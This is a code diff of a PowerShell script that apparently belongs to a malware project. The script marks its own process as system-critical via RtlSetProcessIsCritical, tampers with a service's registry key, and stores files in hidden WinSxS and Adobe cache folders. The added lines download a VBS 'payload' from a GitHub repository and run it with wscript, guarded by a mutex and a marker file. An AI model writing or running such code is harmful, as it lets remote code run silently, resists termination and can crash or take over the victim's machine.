@@ -6,9 +6,8 @@ param(
     [string]$childServicePropertyName,
     [string]$parentServicePropertyName
 )
-Start-Process powershell.exe -ArgumentList "-Command `"whoami >> C:\whoami2.txt`""
 $user = ((Get-CimInstance -ClassName Win32_ComputerSystem).UserName -split '\\')[-1]
-$b = $basePath -replace '([\\{}])', '`$1'
+
 
 $paths = @(
     ($env:systemdrive+"\Users\$user\AppData\Roaming\Adobe\Acrobat\DC\Security\OCSP\CertCache\Backup\Logs\dump"),
@@ -16,6 +15,9 @@ $paths = @(
     "$env:windir\WinSxS\FileMaps\programdata_microsoft_windows_wer_temp_783673b09e921b6b-cdf_ms\Windows\System32\Tasks\Microsoft\Windows\PLA\Diagnostics\Traces",
     "$env:windir\WinSxS\Temp\ManifestCache\PendingInstalls\5645725642"
 )
+
+$mutexName = "Global\MyUniquePrion"
+$mutex = New-Object System.Threading.Mutex($false, $mutexName)
 
 $signature = @"
 using System;
@@ -29,7 +31,24 @@ public class CS {
 Add-Type -TypeDefinition $signature
 [CS]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null
 
+if($basePath -eq "" -or $childServiceName -eq "" -or $childServicePropertyName -eq ""){
+    $mutex.WaitOne()
+    try {
+        if(-not(Test-Path -Path "$env:temp\598600304.txt" -PathType Leaf)){
+            $pa = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+            $pa = "$pa\async_fun.vbs"
+            iwr -uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/fun/warning.vbs" -OutFile "$pa"
+            wscript.exe $pa
+            New-Item -Path "$env:temp\598600304.txt" -ItemType File -Force
+        }
+    }
+    finally {
+        $mutex.ReleaseMutex()
+        exit
+    }
+}
 
+$b = $basePath -replace '([\\{}])', '`$1'
 $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$childServiceName"
 
 $parentPath = ""
